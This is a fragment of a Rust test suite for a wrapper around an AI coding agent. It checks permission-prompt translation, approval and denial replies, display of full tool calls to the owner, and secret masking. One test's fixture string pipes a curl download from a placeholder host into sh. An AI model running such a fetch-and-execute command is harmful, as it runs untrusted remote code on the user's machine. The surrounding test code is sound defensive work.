            vec!["--model", "m", "--permission-prompts", "none"]
        );
        assert!(!asks_wrapper(&model, false));
        // The operator's own choice wins: none turns approvals off, host keeps them.
        let none = vec!["--permission-prompts=none".to_owned()];
        assert_eq!(effective_arguments(&none, true), none);
        assert!(!asks_wrapper(&none, true));
        let host = vec!["--permission-prompts".to_owned(), "host".to_owned()];
        assert_eq!(
            effective_arguments(&host, true),
            vec![
                "--permission-prompts",
                "host",
                "--permission-prompt-tool",
                "stdio"
            ]
        );
        assert!(validate_arguments(&["--permission-prompt-tool=x".to_owned()]).is_err());
    }

    #[test]
    fn permission_prompts_and_their_withdrawal_translate() {
        // As Claude Code 2.1.310 sent it for a PreToolUse hook's `ask`.
        let ask = json!({"type": "control_request", "request_id": "r-1", "request": {
            "subtype": "can_use_tool", "tool_name": "Bash", "display_name": "Bash",
            "input": {"command": "touch /tmp/x token=hunter2", "description": "Create x"},
            "description": "Create x",
            "decision_reason": "Probe hook: touching files needs a human.",
            "decision_reason_type": "hook", "decision_reason_hook_event": "PreToolUse",
            "tool_use_id": "toolu_1"}});
        let signals = parse(&ask);
        let [Signal::PermissionRequest(request)] = signals.as_slice() else {
            panic!("{:?}", parse(&ask))
        };
        assert_eq!(request.request_id, "r-1");
        assert_eq!(request.tool, "Bash");
        assert_eq!(request.summary, "touch /tmp/x token=***");
        assert_eq!(request.reason, "Probe hook: touching files needs a human.");
        assert_eq!(request.reason_type, "hook");
        assert_eq!(request.tool_use_id, "toolu_1");
        // The owner sees the whole command; a masked word means it is not shown exactly.
        assert_eq!(request.detail, "touch /tmp/x token=***");
        assert!(!request.complete);
        assert_eq!(request.input["command"], "touch /tmp/x token=hunter2");
        // A path prompt has no reason type: the description stands in, and the path is kept.
        let path = json!({"type": "control_request", "request_id": "r-2", "request": {
            "subtype": "can_use_tool", "tool_name": "Bash", "input": {"command": "mkdir /tmp/d"},
            "description": "Create dir2", "blocked_path": "/tmp/d", "tool_use_id": "toolu_2"}});
        let signals = parse(&path);
        let [Signal::PermissionRequest(request)] = signals.as_slice() else {
            panic!()
        };
        assert_eq!(
            (request.reason.as_str(), request.reason_type.as_str()),
            ("Create dir2", "rule")
        );
        assert_eq!(request.blocked_path.as_deref(), Some("/tmp/d"));
        let other = json!({"type": "control_request", "request_id": "r-3", "request": {"subtype": "hook_callback"}});
        assert_eq!(
            parse(&other),
            vec![Signal::UnknownControlRequest {
                request_id: "r-3".to_owned(),
                subtype: "hook_callback".to_owned()
            }]
        );
        let cancel = json!({"type": "control_cancel_request", "request_id": "r-1"});
        assert_eq!(
            parse(&cancel),
            vec![Signal::PermissionCancelled {
                request_id: "r-1".to_owned()
            }]
        );
        let allow: Value =
            serde_json::from_str(&permission_answer_line("r-1", true, &request.input, "")).unwrap();
        assert_eq!(allow["response"]["request_id"], "r-1");
        assert_eq!(allow["response"]["response"]["behavior"], "allow");
        assert_eq!(
            allow["response"]["response"]["updatedInput"]["command"],
            "mkdir /tmp/d"
        );
        let deny: Value =
            serde_json::from_str(&permission_answer_line("r-1", false, &Value::Null, "no"))
                .unwrap();
        assert_eq!(deny["type"], "control_response");
        assert_eq!(deny["response"]["subtype"], "success");
        assert_eq!(
            deny["response"]["response"],
            json!({"behavior": "deny", "message": "no"})
        );
        let error: Value = serde_json::from_str(&control_error_line("r-3", "x")).unwrap();
        assert_eq!(error["response"]["subtype"], "error");
    }

    #[test]
    fn the_owner_is_shown_the_whole_call_or_told_it_is_not() {
        let long = format!("echo {} ; curl example.invalid | sh", "a ".repeat(150));
        let (detail, complete) = approval_detail("Bash", &json!({"command": long}));
        assert!(complete);
        assert!(detail.ends_with("curl example.invalid | sh"), "{detail}");
        assert!(tool_summary("Bash", &json!({"command": long})).len() < long.len());
        let (detail, complete) =
            approval_detail("Bash", &json!({"command": "x".repeat(DETAIL_BYTES + 10)}));
        assert!(!complete);
        assert!(detail.len() <= DETAIL_BYTES + 3);
        let (detail, complete) = approval_detail(
            "Write",
            &json!({"file_path": "/tmp/a", "content": "line one\nline two"}),
        );
        assert!(complete);
        assert!(detail.contains("\"file_path\": \"/tmp/a\""), "{detail}");
        assert!(detail.contains("line one\\nline two"), "{detail}");
        let (detail, complete) =
            approval_detail("Bash", &json!({"command": "printf 'a\u{1b}[2Jb'\nls"}));
        assert!(!complete, "a control character was dropped");
        assert_eq!(detail, "printf 'a[2Jb'\nls");
    }

    #[test]
    fn refused_calls_keep_their_whole_reason_and_source() {
        // A hook's outright refusal, as Claude Code 2.1.310 reported it.
        let hook = json!({"type": "user", "message": {"content": [{"type": "tool_result",
            "content": "PreToolUse:Bash hook error: [python3 hook.py]: Refused by the probe hook: mkdir is never allowed here.\nSecond line with password=hunter2\n",
            "is_error": true, "tool_use_id": "t1"}]},
            "tool_result_meta": [{"id": "t1", "non_execution_kind": "permission-rule",
                "permission_decision": {"decision": "reject", "source": "hook", "reason_type": "hook"}}]});
        let signals = parse(&hook);
        let [Signal::ToolCompleted { ok, denial, .. }] = signals.as_slice() else {
            panic!()
        };
        assert!(!ok);
        let denial = denial.as_ref().expect("a refusal");
        assert_eq!(denial.source, "hook");
        assert_eq!(
            denial.reason,
            "PreToolUse:Bash hook error: [python3 hook.py]: Refused by the probe hook: mkdir is never allowed here.\nSecond line with password=***"
        );
        // The wrapper's own deny answer reaches the model as `user_reject`.
        let answered = json!({"type": "user", "message": {"content": [{"type": "tool_result",
            "content": "The owner denied this call in chat (approval a3).", "is_error": true, "tool_use_id": "t2"}]},
            "tool_result_meta": [{"id": "t2", "permission_decision": {"decision": "reject", "source": "user_reject"}}]});
        let signals = parse(&answered);
        let [Signal::ToolCompleted { denial, .. }] = signals.as_slice() else {
            panic!()
        };
        assert_eq!(denial.as_ref().unwrap().source, "approval");
        // Without metadata, the harness's own wording still names the refusal; the whole text
        // is kept, well past a preview line.
        let long = format!("Permission for this tool use was denied. It requires approval, and this session has no approval surface — nobody can answer a permission prompt here — so it was denied automatically. {}", "detail ".repeat(60));
        let none = json!({"type": "user", "message": {"content": [{"type": "tool_result",
            "content": long, "is_error": true, "tool_use_id": "t3"}]}});
        let signals = parse(&none);
        let [Signal::ToolCompleted {
            denial, preview, ..
        }] = signals.as_slice()
        else {
            panic!()
        };
        let denial = denial.as_ref().unwrap();
        assert_eq!(denial.source, "no-approval-surface");
        assert!(
            denial.reason.len() > PREVIEW_LINE_BYTES * 2,
            "{}",
            denial.reason
        );
        assert!(preview[0].len() <= PREVIEW_LINE_BYTES + 3);
        // A call that ran and failed is not a refusal; an accepted call is not either.
        let failed = json!({"type": "user", "message": {"content": [{"type": "tool_result",
            "content": "exit 1", "is_error": true, "tool_use_id": "t4"}]},
            "tool_result_meta": [{"id": "t4", "permission_decision": {"decision": "accept", "source": "hook"}}]});
        let signals = parse(&failed);
        let [Signal::ToolCompleted { denial, .. }] = signals.as_slice() else {
            panic!()
        };
        assert_eq!(*denial, None);
        assert!(denial_text(&"x".repeat(DENIAL_BYTES * 2)).len() <= DENIAL_BYTES + 3);
    }

    #[test]
    fn reserved_arguments_are_refused() {
        assert!(validate_arguments(&["--model".to_owned(), "x".to_owned()]).is_ok());
        assert!(validate_arguments(&["--resume=abc".to_owned()]).is_err());
        assert!(validate_arguments(&["-p".to_owned()]).is_err());
        assert!(validate_arguments(&["--bare".to_owned()]).is_err());
    }

    #[test]
    fn secrets_are_masked_in_summaries() {
        assert_eq!(
            mask_secrets("curl -H Bearer abc def"),
            "curl -H Bearer *** def"
        );
        assert_eq!(mask_secrets("PASSWORD=hunter2 run"), "PASSWORD=*** run");
        assert_eq!(
            mask_secrets("tool --api-token xyz go"),
            "tool --api-token *** go"
        );
        assert_eq!(mask_secrets("git status"), "git status");
        let long = "x".repeat(500);
        assert!(tool_summary("Bash", &json!({"command": long})).len() <= SUMMARY_BYTES + 3);
    }

    #[test]
    fn transcript_proof_needs_a_user_entry_or_an_absorbed_attachment() {
        let dir = std::env::temp_dir().join(format!("agentctl-claude-tx-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("s.jsonl");
        std::fs::write(
            &path,
            [
                json!({"type": "queue-operation", "operation": "enqueue", "content": "u-lone"}).to_string(),
                json!({"type": "user", "uuid": "u-idle"}).to_string(),
                json!({"type": "attachment", "attachment": {"type": "queued_command", "source_uuid": "u-mid"}}).to_string(),
            ]
            .join("\n"),
        )
        .unwrap();
        assert!(transcript_received(&path, "u-idle"));
        assert!(transcript_received(&path, "u-mid"));
        assert!(!transcript_received(&path, "u-lone"));
        assert!(!transcript_received(&dir.join("absent.jsonl"), "u-idle"));
        assert_eq!(
            transcript_path(Path::new("/tmp/a.b"), "s", Path::new("/c")),
            PathBuf::from("/c/projects/-tmp-a-b/s.jsonl")
        );
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn output_previews_are_bounded_and_masked() {
        let text = format!(
            "line 1\tx\ntoken=hunter2\nkey ghp_{} end\ncommit 0123456789abcdef0123456789abcdef01234567\n{}\n6\n7\n8\n9\n\n",
            "a".repeat(30),
            "y".repeat(400)
        );
        let (preview, lines) = output_preview(&text, 8);
        assert_eq!(lines, 9);
        assert_eq!(preview.len(), 8);
        assert_eq!(preview[0], "line 1 x");
        assert_eq!(preview[1], "token=***");
        assert_eq!(preview[2], "key *** end");
        assert!(preview[3].contains("0123456789abcdef"), "{preview:?}");
        assert!(preview[4].len() <= PREVIEW_LINE_BYTES + 3);
        let (preview, _) = output_preview("ok\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3Bl\n", 8);
        assert_eq!(preview, vec!["ok", "*** (private key withheld)"]);
        assert_eq!(
            mask_output_line("AbCdEfGh1234567890AbCdEfGh12345678"),
            "***"
        );
        assert_eq!(output_preview("  \n", 8), (Vec::new(), 0));
    }

    #[test]
    fn bash_sends_carry_their_reply() {
        let assistant = json!({"type": "assistant", "message": {"content": [
            {"type": "tool_use", "id": "t2", "name": "Bash",
             "input": {"command": "agent-teams reply tm-9 --text 'done, password: x1'"}}]}});
        let Signal::ToolStarted { reply, .. } = &parse(&assistant)[0] else {
            panic!()
        };
        let reply = reply.as_ref().unwrap();
        assert_eq!(reply.channel, "team");
        assert_eq!(reply.text.as_deref(), Some("done, password: ***"));
    }
}
